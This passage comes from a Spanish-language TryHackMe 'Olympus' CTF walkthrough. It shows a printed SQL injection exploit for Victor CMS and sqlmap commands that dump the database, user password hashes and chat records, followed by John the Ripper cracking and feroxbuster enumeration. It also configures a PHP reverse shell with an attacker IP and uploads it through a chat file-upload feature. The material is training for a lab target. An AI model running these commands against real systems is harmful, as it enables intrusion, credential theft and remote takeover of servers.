</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>locate 48485.txt
<span class="go">/usr/share/exploitdb/exploits/php/webapps/48485.txt

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat</span> /usr/usr/share/exploitdb/exploits/php/webapps/48485.txt
<span class="gp">#</span><span class="w"> </span>Exploit Title: Victor CMS 1.0 - <span class="s1">'cat_id'</span> SQL Injection
<span class="gp">#</span><span class="w"> </span>Google Dork: N/A
<span class="gp">#</span><span class="w"> </span>Date: 2020-05-19
<span class="gp">#</span><span class="w"> </span>Exploit Author: Kishan Lal Choudhary
<span class="gp">#</span><span class="w"> </span>Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
<span class="gp">#</span><span class="w"> </span>Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
<span class="gp">#</span><span class="w"> </span>Version: 1.0
<span class="gp">#</span><span class="w"> </span>Tested on: Windows 10
<span class="go">
Description: The GET parameter 'category.php?cat_id=' is vulnerable to SQL Injection

Payload: UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

http://localhost/category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10+--

By exploiting the SQL Injection vulnerability by using the mentioned payload, an attacker will be able to retrieve the database name and version of mysql running on the server.   
</span></pre></table></code></div></div><p>El exploit nos cuenta que el CMS es vulnerable a SQLi y nos muestra el payload que podemos utilizar atacando al parametro GET <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">cat_id</code>  de la URL.</p><p>Una opción es seguir el método de edición de URL que nos propone el exploit, otra a mi parecer más práctica y rápida: utilizar <strong>sqlmap</strong>.</p><blockquote><p><strong>Nota:</strong> a partir de la información recopilada hasta aquí se nos presentan diversas vías para continuar avanzando. En nuestro caso, y en aras de la brevedad, solo nos centraremos en una. Otra opción con un recorrido similar, vinculada al input de búsqueda y la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/search.php</code>  podéis consultarla <a href="https://www.exploit-db.com/exploits/48734">aquí</a>.</p></blockquote><h2 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Vamos con <strong>sqlmap</strong>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">--dbs</span>
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-u</code> : la URL target.<li><code class="language-plaintext highlighter-rouge">-p</code> : el parámetro que queremos atacar.<li><code class="language-plaintext highlighter-rouge">--dbs</code> : le pedimos que nos devuelva un listado de las Bases de Datos que encuentre.</ul><p>Le damos amor y nos devuelve lo siguiente:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[...]
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
[...]
</pre></table></code></div></div><p>Candidata al Oscar la db <em>olympus</em>, así que a por sus tablas.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">--tables</span>
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-D</code> : el nombre de la DB que queremos escanear.<li><code class="language-plaintext highlighter-rouge">--tables</code> : le pedimos que nos devuelva un listado de las tablas que encuentre.</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[...]
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
[...]
</pre></table></code></div></div><p>De un primer vistazo la tabla <em>flag</em> promete felicidad, vamos a por ella.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">-T</span> flag <span class="nt">--columns</span>
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-T</code> : el nombre de la tabla que queremos analizar.<li><code class="language-plaintext highlighter-rouge">--columns</code> : le pedimos que nos muestre la estructura de la tabla.</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>[...]
Database: olympus
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
[...]
</pre></table></code></div></div><p>Volcamos su contenido:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">-T</span> flag  <span class="nt">--dump</span>
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">--dump</code> : nos vuelca los registros de la tabla.</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>[...]
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{xxxxxxxxxxxxxxxxxxx} |
+---------------------------+
[...]
</pre></table></code></div></div><p>Ha caído la primera.</p><p>Del listado de tablas que nos ha devuelto <strong>sqlmap</strong> solo hemos sacado partido a la tabla <em>flag</em>, así que vamos a por <em>user</em>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">-T</span> <span class="nb">users</span>  <span class="nt">--columns</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>[...]
Database: olympus
Table: users
[9 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| randsalt       | varchar(255) |
| user_email     | varchar(255) |
| user_firstname | varchar(255) |
| user_id        | int          |
| user_image     | text         |
| user_lastname  | varchar(255) |
| user_name      | varchar(255) |
| user_password  | varchar(255) |
| user_role      | varchar(255) |
+----------------+--------------+
[...]
</pre></table></code></div></div><p>Nos traemos las columnas <em>user_name</em>, <em>user_password</em> y <em>user_email</em></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">-T</span> <span class="nb">users</span>  <span class="nt">-C</span> user_name,user_password,user_email <span class="nt">--dump</span>
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-C</code> : nos permite listar las columnas que nos queremos traer.</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[...]
Database: olympus
Table: users
[3 entries]
+------------+--------------------------------------------------------------+------------------------+
| user_name  | user_password                                                | user_email             |
+------------+--------------------------------------------------------------+------------------------+
| prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus@olympus.thm |
| root       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root@chat.olympus.thm  |
| zeus       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus@chat.olympus.thm  |
+------------+--------------------------------------------------------------+------------------------+
[...]
</pre></table></code></div></div><p>Bien. Qué hemos conseguido ? Una relación de usuarios y hashes, guay. Pero qué más ? … Mirad con atención las direcciones de correo. Bingo ! … al parecer hay un subdominio en danza <em>chat.olympus.thm</em> … existirá realmente ? … estará operativo ? …</p><p>A saber, pero antes de salir de dudas a ese respecto y aprovechando que estamos con <strong>sqlmap</strong>, si revisamos nuestras notas veremos que hay una tabla <em>chats</em> dentro de la DB <em>olympus</em>. Vamos a volcarla a ver qué nos cuenta.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">-T</span> chats  <span class="nt">--dump</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | &lt;blank&gt;                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | &lt;blank&gt;                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

</pre></table></code></div></div><p>Bien. El dump nos ofrece una conjunto de registros con mensajes y algunos datos interesantes:</p><ul><li><p>El usuario <em>prometheus</em> ha atacheado un fichero con el nombre <em>“prometheus_password.txt”</em>, pero al intentar descargarlo de la <em>“upload folder”</em>, no ha podido. Al parecer el fichero ha sufrido algun tipo de <em>“modificación”</em>.</p><li><p>El usuario <em>zeus</em> le responde contándole que el <em>“IT guy”</em> ha implementado una función que modifica el nombre de los ficheros de manera aleatoria, antes de almacenarlos, con el objetivo de dificultar el acceso a posibles atacantes.</p><li><p>Un nombre de fichero <em>“47c3210d51761686f3af40a875eeaaea.txt”</em> aparece asociado al registro del envío de <em>“prometheus_password.txt”</em></p></ul><p>Podemos deducir de lo anterior que el sitio implementa algun tipo de función que modifica el nombre del fichero adjuntado por el usuario antes de almacenarlo en la “<em>upload folder”</em>, y registra este nombre modificado en el campo <em>file</em> de la tabla <em>chats</em>.</p><p>Tareas ? … acceder a <em>chat.olympus.thm</em>, localizar la <em>“upload folder”</em> y ver si nuestra teoría es cierta intentando descargar el fichero <em>“47c3210d51761686f3af40a875eeaaea.txt”</em>. De confirmarlo: podremos aprovecharnos de ello con bondad infinita.</p><p>Para confirmar que hay alguien escuchando en <em>chat.olympus.thm</em> via navegador lo primero es añadir la entrada correspondiente a nuestro <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.129.191	chat.olympus.thm
</pre></table></code></div></div><p>Se carga la página <em>chat.olympus.thm/login.php</em> con un vistoso formulario de Login.</p><p><img data-src="/assets/posts/20220804/img07.png" alt="" data-proofer-ignore></p><p>Guay, el sitio está operativo. Toca sacarle partido a los registros de la tabla <em>users</em> para intentar logarnos. Pasamos al siguiente nivel: Cracking.</p><h2 id="cracking"><span class="mr-2">Cracking</span><a href="#cracking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A partir del volcado que tenemos de la tabla <em>users</em> creamos un fichero con los datos en formato …</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>user:password
user:password
user:password
</pre></table></code></div></div><p>Lo guardamos con el nombre que queramos, por ejemplo <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">users.hashes</code>  y recurrimos a nuestro fiel amigo <strong>John The Ripper</strong> utilizando <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/usr/share/wordlists/rockyou.txt</code>  como diccionario.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt users.hashes
</pre></table></code></div></div><p>Tras un buen rato currando, <strong>John</strong> nos devuelve la respuesta. En este caso, solo ha podido resolver una de las claves.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[...]
0g 0:00:01:57 0.01% (ETA: 2022-08-08 04:10) 0g/s 18.98p/s 57.24c/s 57.24C/s allen..meandyou
xxxxxxxxxx       (prometheus)
1g 0:00:05:47 0.04% (ETA: 2022-08-07 06:07) 0.002875g/s 20.59p/s 52.89c/s 52.89C/s gomez..flower2
[...]
</pre></table></code></div></div><p>Con éstas credenciales en la mano toca intentar dos cosas:</p><ol><li><p>Utilizarlas en el form de Login que viene al final de <em>http://olympus.thm/~webmaster/index.php</em></p><li><p>Utilizarlas en el form de Login de <em>http://chat.olympus.thm/login.php</em></p></ol><h2 id="enumeración-ii"><span class="mr-2">Enumeración II</span><a href="#enumeración-ii" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Arrancamos con …</p><p><img data-src="/assets/posts/20220804/img05.png" alt="" data-proofer-ignore></p><p>Probamos y accedemos al dashboard del CMS …</p><p><img data-src="/assets/posts/20220804/img06.png" alt="" data-proofer-ignore></p><p>Toca trastear y ver lo que nos ofrece.</p><p>Probamos con la web del chat:</p><p><img data-src="/assets/posts/20220804/img08.png" alt="" data-proofer-ignore></p><p>Buena pinta. Una página en la que aparecen los mensajes almacenados en la tabla <em>chats</em>.</p><p>De las dos vías de avance que acabamos de abrir (el dashboard y el chat) vamos a trabajar con ésta última.</p><p>Según la hoja de ruta que nos hemos dado toca lozalizar la <em>“upload folder”</em> e intentar descargarnos el fichero <em>“47c3210d51761686f3af40a875eeaaea.txt”</em>. Tiramos de <strong>feroxbuster</strong> para la primer tarea.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://chat.olympus.thm/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-e</span> <span class="nt">-t</span> 100 <span class="nt">-o</span> feroxbuster_chat_output
<span class="go">[...]
</span><span class="gp">[#</span><span class="c">###################] - 18s    18880/18880   0s      found:28      errors:71     </span>
<span class="gp">[#</span><span class="c">###################] - 15s     4714/4714    302/s   http://chat.olympus.thm/ </span>
<span class="gp">[#</span><span class="c">###################] - 9s      4714/4714    501/s   http://chat.olympus.thm/javascript </span>
<span class="gp">[#</span><span class="c">###################] - 7s      4714/4714    0/s     http://chat.olympus.thm/static =&gt; Directory listing</span>
<span class="gp">[#</span><span class="c">###################] - 7s      4714/4714    657/s   http://chat.olympus.thm/javascript/jquery </span>
<span class="gp">[#</span><span class="c">###################] - 9s      4714/4714    515/s   http://chat.olympus.thm/uploads </span>
<span class="gp">[#</span><span class="c">###################] - 8s      4714/4714    0/s     http://chat.olympus.thm/static/images =&gt; Directory listing</span>
</pre></table></code></div></div><p>Bien, el nombre de la “<em>upload folder</em>” parece ser … <em>uploads</em> … no se podía saber ;)</p><p>Intentamos descargarnos el fichero.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt
</pre></table></code></div></div><p>Qué os parece el mensaje que nos da ?</p><p>Cachondo el tío. Seguimos con nuestro plan y desde la vista del chat probamos a enviar un fichero .txt con una línea de texto cualquiera y el nombre <em>“a.txt”</em> por ejemplo. Lo enviámos y volvemos a sacar un volcado de la tabla <em>chats</em></p><blockquote><p><strong>Tip:</strong> si el dump no se actualiza añadir la flag <code class="language-plaintext highlighter-rouge">--flush-session</code> para refrescar la consulta.</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://olympus.thm/~webmaster/category.php?cat_id=1'</span> <span class="nt">-p</span> <span class="s1">'cat_id'</span> <span class="nt">-D</span> olympus <span class="nt">-T</span> chats  <span class="nt">--dump</span>
<span class="go">[...]
Database: olympus
Table: chats
[5 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
</span><span class="gp">| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | &lt;blank&gt;</span><span class="w">                              </span>| prometheus |
<span class="gp">| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | &lt;blank&gt;</span><span class="w">                              </span>| zeus       |
<span class="gp">| 2022-08-04 | prueba                                                                                                                                                          | &lt;blank&gt;</span><span class="w">                              </span>| prometheus |
<span class="go">| 2022-08-04 | Attached : a.txt                                                                                                                                                | 012a4f36f3ba4e3c90e2606db849bfef.txt | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
</span></pre></table></code></div></div><p>Intentamos descargar el fichero que acabamos de subir utilizando el campo <em>file</em> del dump para ello</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://chat.olympus.thm/uploads/012a4f36f3ba4e3c90e2606db849bfef.txt
</pre></table></code></div></div><p>Vale, sospechas confirmadas. Nuevas tareas:</p><ul><li><p>Subir una shell inversa en php que utilizaremos para establecer una conexión entre el server y nuestro equipo local.</p><li><p>Repetir el dump contra <em>chats</em> para obtener el nombre con el que se ha almacenado nuetro fichero con la shell.</p><li><p>Arrancar una escucha en local con <strong>netcat</strong></p><li><p>Pedir el fichero al server para forzar la conexión.</p></ul><p>Vamos a ello. Lo primero es localizar en nuestro Kali el fichero que necesitamos, copiarlo a nuestro directorio de trabajo y editarlo.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>tree /usr/share/webshells/
<span class="go">/usr/share/webshells/
[...]
|-- php
|   |-- findsocket
|   |   |-- findsock.c
|   |   `-- php-findsock-shell.php
|   |-- php-backdoor.php
|   |-- php-reverse-shell.php
|   |-- qsd-php-backdoor.php
|   `-- simple-backdoor.php
[...]

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="nb">.</span>
</pre></table></code></div></div><p>Abrimos el fichero <em>php-reverse-shell.php</em> en nuestro editor y modificamos los parámetros necesarios</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>[...]
$ip = '10.18.xx.xx';  // CHANGE THIS    &lt;- nuestra IP local
$port = 4321;       // CHANGE THIS      &lt;- el puerto en el que estaremos escuchando
[...]
</pre></table></code></div></div><p>Subimos el fichero <em>php-reverse-shell.php</em> al server valiéndonos de la página de chat y volvemos a volcar <em>chats</em></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>Database: olympus
Table: chats
[7 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | &lt;blank&gt;                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | &lt;blank&gt;                              | zeus       |
| 2022-08-04 | prueba                                                                                                                                                          | &lt;blank&gt;                              | prometheus |
| 2022-08-04 | Attached : a.txt                                                                                                                                                | 012a4f36f3ba4e3c90e2606db849bfef.txt | prometheus |
| 2022-08-04 | shell                                                                                                                                                           | &lt;blank&gt;                              | prometheus |
| 2022-08-04 | Attached : php-reverse-shell.php                                                                                                                                | 99e7c69732975b95791508afdabc5057.php | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

